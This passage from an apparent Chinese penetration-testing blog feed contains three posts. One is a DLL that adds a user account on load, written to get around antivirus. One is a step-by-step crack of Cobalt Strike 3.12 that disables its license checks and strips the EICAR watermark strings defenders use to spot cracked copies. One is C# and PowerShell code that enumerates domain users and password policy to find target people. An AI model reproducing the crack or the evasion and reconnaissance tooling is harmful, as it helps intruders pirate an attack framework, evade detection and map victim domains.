class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二）dll生成"><a href="#二）dll生成" class="headerlink" title="二）dll生成"></a>二）dll生成</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#ifndef UNICODE</span></span><br><span class="line"><span class="meta">#define UNICODE</span></span><br><span class="line"><span class="meta">#endif</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="string">"netapi32"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string">&lt;lm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;atlimage.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> NetUserAdd()</span><br><span class="line">&#123;</span><br><span class="line">....</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpvRevered) &#123;</span><br><span class="line"><span class="keyword">switch</span> (dwReason) &#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">NetUserAdd()<span class="comment">;</span></span><br><span class="line"><span class="built_in">break</span><span class="comment">;</span></span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="built_in">break</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">TRUE</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在编译代码的时候，选择MT，所有的依赖文件都会编进去。<br><img src="/image/创建用户，并添加至管理组/blog_2018-11-15_11-35-4320.png" alt="blog_2018-11-15_11-35-4320"></p><h2 id="0x02-备注"><a href="#0x02-备注" class="headerlink" title="0x02 备注"></a>0x02 备注</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">支持最低客户端:Windows 2000 Professional [仅desktop apps]</span><br><span class="line">支持最低服务器:Windows 2000<span class="built_in"> Server </span>[仅desktop apps]</span><br><span class="line">目标平台: Windows</span><br><span class="line">Header: lmaccess.h (include Lm.h)</span><br><span class="line">Library: Netapi32.lib</span><br><span class="line">DLL: Netapi32.dll</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;摘要: 因有些需求，需要本地/远程添加用户。所以直接选择&lt;code&gt;Windows API函数&lt;/code&gt;进行编写，因为部分杀软限制了&lt;code&gt;CMD&lt;/code&gt;。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
      <category term="C++" scheme="https://rcoil.me/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>Cobalt Strike 3.12 破解</title>
    <link href="https://rcoil.me/2018/10/CobaltStrike-3-12-%E7%A0%B4%E8%A7%A3/"/>
    <id>https://rcoil.me/2018/10/CobaltStrike-3-12-破解/</id>
    <published>2018-10-21T07:40:19.000Z</published>
    <updated>2018-11-17T04:27:44.529Z</updated>
    
    <content type="html"><![CDATA[<p>听说有更新，所以就拿来看看，按照3.8的破解流程。<br><a id="more"></a></p><h2 id="0x00-Cobalt-Strike3-12-下载"><a href="#0x00-Cobalt-Strike3-12-下载" class="headerlink" title="0x00 Cobalt Strike3.12 下载"></a>0x00 Cobalt Strike3.12 下载</h2><p>原版：<a href="https://github.com/microidz/Cobaltstrike-Trial" target="_blank" rel="noopener">https://github.com/microidz/Cobaltstrike-Trial</a></p><p>校验：<a href="https://verify.cobaltstrike.com/" target="_blank" rel="noopener">https://verify.cobaltstrike.com/</a></p><p>xor.bin：<a href="https://github.com/verctor/CS_xor64" target="_blank" rel="noopener">https://github.com/verctor/CS_xor64</a></p><p>破解记录</p><h2 id="0x01-文件文件位置"><a href="#0x01-文件文件位置" class="headerlink" title="0x01 文件文件位置"></a>0x01 文件文件位置</h2><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">common/License.<span class="keyword">class</span>  <span class="meta"># 修改时间及提示框</span></span><br><span class="line">common/ArtifactUtils.<span class="keyword">class</span>  <span class="meta"># 去除后门特征指纹</span></span><br><span class="line">server/ProfileEdits.<span class="keyword">class</span> <span class="meta"># 去除后门特征指纹</span></span><br><span class="line">aggressor/dialogs/ListenerDialog.<span class="keyword">class</span>  <span class="meta"># 去除listener个数限制</span></span><br><span class="line">aggressor/AggressorClient.<span class="keyword">class</span>  <span class="meta"># 标题栏修改</span></span><br><span class="line">resources/<span class="keyword">xor</span>.bin  <span class="meta"># 放入xor.bin文件</span></span><br><span class="line">resources/xor64.bin  <span class="meta"># 放入xor.bin文件</span></span><br></pre></td></tr></table></figure><h2 id="0x02-License-class"><a href="#0x02-License-class" class="headerlink" title="0x02 License.class"></a>0x02 License.class</h2><p>首先将cobaltstrike.jar以压缩包格式打开，复制License.class出来，然后运行<code>jad.exe License.class</code>，jad目录下就会生成<code>License.jad</code>，修改后缀为<code>Java</code>，即是源码文件了。</p><p>这里将提供两种破解思路。</p><ul><li><p>(1) 直接修改试用时间</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">long</span> life = <span class="number">21L</span>;</span><br><span class="line">将<span class="number">21</span>天的试用期修改成</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">long</span> life = <span class="number">99999L</span>;</span><br></pre></td></tr></table></figure></li><li><p>(2) 修改isTrail的判断逻辑 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isTrial</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">修改成</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isTrial</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul><p>往下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkLicenseGUI</span><span class="params">(Authorization auth)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br><span class="line">修改成</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkLicenseGUI</span><span class="params">(Authorization authorization)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">同理</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkLicenseConsole</span><span class="params">(Authorization authorization)</span></span></span><br></pre></td></tr></table></figure></p><h2 id="0x03-去除listener个数限制"><a href="#0x03-去除listener个数限制" class="headerlink" title="0x03 去除listener个数限制"></a>0x03 去除listener个数限制</h2><p>文件在<code>aggressor/dialogs/ListenerDialog.class</code></p><p>去除<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(Listener.isEgressBeacon(payload) &amp;&amp; DataUtils.isBeaconDefined(datal) &amp;&amp; !name.equals(DataUtils.getEgressBeaconListener(datal)))</span><br><span class="line">        &#123;</span><br><span class="line">            DialogUtils.showError(<span class="string">"You may only define one egress Beacon per team server.\nThere are a few things I need to sort before you can\nput multiple Beacon HTTP/DNS listeners on one server.\nSpin up a new team server and add your listener there."</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br></pre></td></tr></table></figure></p><h2 id="0x04-后门特征指纹"><a href="#0x04-后门特征指纹" class="headerlink" title="0x04 后门特征指纹"></a>0x04 后门特征指纹</h2><p>存在后门特征指纹的其中两个地方</p><p>common/ArtifactUtils.class<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">packer.addString(<span class="string">"X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>);</span><br></pre></td></tr></table></figure></p><p>server/ProfileEdits.class<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c2profile.addCommand(<span class="string">".http-get.server"</span>, <span class="string">"!header"</span>, <span class="string">"X-Malware: X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>);</span><br><span class="line">c2profile.addCommand(<span class="string">".http-post.server"</span>, <span class="string">"!header"</span>, <span class="string">"X-Malware: X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>);</span><br><span class="line">c2profile.addCommand(<span class="string">".http-stager.server"</span>, <span class="string">"!header"</span>, <span class="string">"X-Malware: X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>);</span><br><span class="line">c2profile.addCommand(<span class="string">".stage.transform-x86"</span>, <span class="string">"append"</span>, <span class="string">"X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>);</span><br><span class="line">c2profile.addCommand(<span class="string">".stage.transform-x64"</span>, <span class="string">"append"</span>, <span class="string">"X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>);</span><br></pre></td></tr></table></figure></p><h2 id="0x05-结果"><a href="#0x05-结果" class="headerlink" title="0x05 结果"></a>0x05 结果</h2><p>最后使用<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">javac</span> <span class="selector-tag">-classpath</span> <span class="selector-tag">cobaltstrike</span><span class="selector-class">.jar</span> <span class="selector-tag">xxxx</span><span class="selector-class">.java</span></span><br></pre></td></tr></table></figure></p><p>进行编译<br><img src="/image/CobaltStrike-3-12-破解/Snipaste_2018-11-08_17-38-29.PNG" alt="Snipaste_2018-11-08_17-38-29"></p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://xz.aliyun.com/t/2170" target="_blank" rel="noopener">https://xz.aliyun.com/t/2170</a><br><a href="https://www.cnblogs.com/ssooking/p/9825917.html" target="_blank" rel="noopener">https://www.cnblogs.com/ssooking/p/9825917.html</a><br><a href="https://www.bilibili.com/video/av34171888/" target="_blank" rel="noopener">https://www.bilibili.com/video/av34171888/</a><br><a href="https://github.com/Lz1y/cobalt_strike_3.12_patch" target="_blank" rel="noopener">https://github.com/Lz1y/cobalt_strike_3.12_patch</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;听说有更新，所以就拿来看看，按照3.8的破解流程。&lt;br&gt;
    
    </summary>
    
      <category term="Tools" scheme="https://rcoil.me/categories/Tools/"/>
    
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>【域渗透】批量 Net User Uname /domain</title>
    <link href="https://rcoil.me/2018/08/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91-%E6%89%B9%E9%87%8FNet-User/"/>
    <id>https://rcoil.me/2018/08/【域渗透】-批量Net-User/</id>
    <published>2018-08-01T09:32:25.000Z</published>
    <updated>2019-04-19T07:09:57.662Z</updated>
    
    <content type="html"><![CDATA[<p>域内批量执行 <code>net user Uname /domain</code></p><a id="more"></a><h2 id="0x00使用场景"><a href="#0x00使用场景" class="headerlink" title="0x00使用场景"></a>0x00使用场景</h2><p>在渗透测试中，需要查找域内某用户的机器所在，必须得确定目标人物所对应的域用户。<br>查找域用户对应的 <code>Full Name</code> 信息，从而确认目标任务对应的域用户。</p><h2 id="0x01-代码"><a href="#0x01-代码" class="headerlink" title="0x01 代码"></a>0x01 代码</h2><p>代码其实很简单，使用 C# 进行编写，可自行编译。</p><p>将所有域用户导入<code>user.txt</code>中（每个域用户一行），遍历文件中的用户，然后调用系统cmd命令执行<code>net user Uname /domain</code>，将运行结果进行输出，可根据自己需求进行二次修改（线程、正则、输出保存）。</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Text.RegularExpressions;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">domain</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">"Tools By RcoIl \r"</span>);</span><br><span class="line">            <span class="keyword">string</span> currentDirectory = Environment.CurrentDirectory;</span><br><span class="line">            <span class="keyword">string</span> text = currentDirectory + <span class="string">"\\user.txt"</span>; <span class="comment">// 文件绝对路径</span></span><br><span class="line">            <span class="keyword">if</span> (!File.Exists(text))</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">"File not found "</span> + text); </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                FileStream stream = <span class="keyword">new</span> FileStream(text, FileMode.Open, FileAccess.Read); <span class="comment">// 打开文本</span></span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    StreamReader streamReader = <span class="keyword">new</span> StreamReader(stream, Encoding.Default); <span class="comment">// 实例化</span></span><br><span class="line">                    <span class="keyword">try</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">while</span> (!streamReader.EndOfStream) <span class="comment">// 读取文本</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">string</span> text2;</span><br><span class="line">                            <span class="keyword">if</span> ((text2 = streamReader.ReadLine()) != <span class="literal">null</span> &amp;&amp; text2.Length != <span class="number">0</span>) </span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="keyword">string</span> id = text2;</span><br><span class="line">                                Program.Check(id);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">finally</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (streamReader != <span class="literal">null</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            ((IDisposable)streamReader).Dispose();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">finally</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (stream != <span class="literal">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        ((IDisposable)stream).Dispose();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                Console.WriteLine(<span class="string">"============================================================"</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">"Finish!"</span>);</span><br><span class="line">                GC.Collect();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Check</span>(<span class="params"><span class="keyword">string</span> id</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            System.Diagnostics.ProcessStartInfo proccessStartInfo = <span class="keyword">new</span> System.Diagnostics.ProcessStartInfo(<span class="string">"net"</span>, <span class="string">"user "</span> + id + <span class="string">" /domain"</span>);</span><br><span class="line">            proccessStartInfo.CreateNoWindow = <span class="literal">true</span>;</span><br><span class="line">            System.Diagnostics.Process proc = <span class="keyword">new</span> System.Diagnostics.Process &#123; StartInfo = proccessStartInfo &#125;;</span><br><span class="line"></span><br><span class="line">            proc.StartInfo.RedirectStandardOutput = <span class="literal">true</span>; <span class="comment">// 由调用程序获取输出信息</span></span><br><span class="line">            proc.StartInfo.UseShellExecute = <span class="literal">false</span>; <span class="comment">// 是否使用操作系统shell启动</span></span><br><span class="line">            proc.StartInfo.CreateNoWindow = <span class="literal">true</span>; <span class="comment">// 不显示程序窗口</span></span><br><span class="line">            proc.Start();  <span class="comment">// 启动程序</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">string</span> outlist = proc.StandardOutput.ReadToEnd(); <span class="comment">// 获取cmd窗口的输出信息</span></span><br><span class="line"></span><br><span class="line">            Regex reg = <span class="keyword">new</span> Regex(<span class="string">".*ame.*"</span>);</span><br><span class="line">            MatchCollection result = reg.Matches(outlist);</span><br><span class="line">            Console.WriteLine(<span class="string">"============================================================"</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (Match match <span class="keyword">in</span> result)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(match);</span><br><span class="line">            &#125;</span><br><span class="line">            proc.WaitForExit(); <span class="comment">// 等待程序执行完退出进程</span></span><br><span class="line">            proc.Close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行效果图：</p><p><img src="/image/域-批量Net-User/1.png" alt=""></p><h2 id="0x02-改进-20190418"><a href="#0x02-改进-20190418" class="headerlink" title="0x02 改进 (20190418)"></a>0x02 改进 (20190418)</h2><p>由于上面的代码略蠢，所以我决定将它进行改进。</p><ul><li>使用 <code>System.DirectoryServices.ActiveDirectory</code> 列举用户；</li><li><p>使用 <code>msvcrt.dll</code> 执行系统命令；</p><p>​</p></li></ul><h3 id="1-powershell-列举用户列表"><a href="#1-powershell-列举用户列表" class="headerlink" title="1) powershell 列举用户列表"></a>1) powershell 列举用户列表</h3><p>这份代码在网上已经很成熟了，可自行查阅。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> DomainUserList</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取当前 Domain 值</span></span><br><span class="line"><span class="variable">$DomainObject</span> =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</span><br><span class="line">    <span class="variable">$CurrentDomain</span> = <span class="string">"LDAP://"</span> + ([ADSI]<span class="string">""</span>).distinguishedName</span><br><span class="line"></span><br><span class="line">    <span class="variable">$UserSearcher</span> = <span class="built_in">New-Object</span> System.DirectoryServices.DirectorySearcher([ADSI]<span class="variable">$CurrentDomain</span>)</span><br><span class="line">    <span class="variable">$DirEntry</span> = <span class="built_in">New-Object</span> System.DirectoryServices.DirectoryEntry</span><br><span class="line">    <span class="variable">$UserSearcher</span>.SearchRoot = <span class="variable">$DirEntry</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="variable">$lockoutThreshold</span> = [int]<span class="variable">$DirEntry</span>.lockoutThreshold.Value</span><br><span class="line">    <span class="built_in">Write-Host</span> -ForegroundColor <span class="string">"yellow"</span> <span class="string">"[*] 当前域的锁定阈值是 $(<span class="variable">$lockoutThreshold</span>)."</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$minPwdLength</span> = [int]<span class="variable">$DirEntry</span>.minPwdLength.Value</span><br><span class="line">    <span class="built_in">Write-Host</span> -ForegroundColor <span class="string">"yellow"</span> <span class="string">"[*] 当前域的最小密码长度是 $(<span class="variable">$minPwdLength</span>)."</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除已禁用的用户列表</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$RemoveDisabled</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment"># 参考资料：http://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/ </span></span><br><span class="line">        <span class="built_in">Write-Host</span> -ForegroundColor <span class="string">"yellow"</span> <span class="string">"[*] 从列表中删除已禁用的用户."</span></span><br><span class="line">        <span class="variable">$UserSearcher</span>.filter = <span class="string">"(&amp;(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2))"</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$UserSearcher</span>.filter = <span class="string">"(&amp;(objectCategory=person)(objectClass=user))"</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 在结果中抓取1000次</span></span><br><span class="line">    <span class="variable">$UserSearcher</span>.PageSize = <span class="number">100</span></span><br><span class="line">    <span class="variable">$AllUserObjects</span> = <span class="variable">$UserSearcher</span>.FindAll()</span><br><span class="line">    <span class="built_in">Write-Host</span> -foregroundcolor <span class="string">"yellow"</span> (<span class="string">"[*] 从当前 AD 域中成功收集了 "</span> + <span class="variable">$AllUserObjects</span>.count + <span class="string">" 个用户"</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$AllUserObjects</span>.Properties.samaccountname</span><br><span class="line">&#125;</span><br><span class="line">DomainUserList</span><br></pre></td></tr></table></figure><p><img src="/image/域-批量Net-User/blog_2019-04-18_14-19-28.png" alt=""></p><p>将代码转换成C#代码，效果如下</p><p><img src="/image/域-批量Net-User/blog_2019-04-18_15-05-37.png" alt=""></p><h3 id="3-成品"><a href="#3-成品" class="headerlink" title="3) 成品"></a>3) 成品</h3><p>其实还是有点麻瓜。</p><p>github: <a href="https://github.com/RcoIl/CSharp_Tools/tree/master/DomainUserList" target="_blank" rel="noopener">DomainUserList</a></p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>在域内使用<code>dsquery</code>查找的信息是有限的，所以需要相应的辅助工具，这个工具存在的意义就是人物与域用户之间的确认。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;域内批量执行 &lt;code&gt;net user Uname /domain&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
      <category term="域渗透" scheme="https://rcoil.me/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>关于windows的RDP连接记录</title>
    <link href="https://rcoil.me/2018/05/%E5%85%B3%E4%BA%8Ewindows%E7%9A%84RDP%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95/"/>
    <id>https://rcoil.me/2018/05/关于windows的RDP连接记录/</id>
    <published>2018-05-12T03:13:20.000Z</published>
    <updated>2019-09-02T02:22:50.074Z</updated>
    
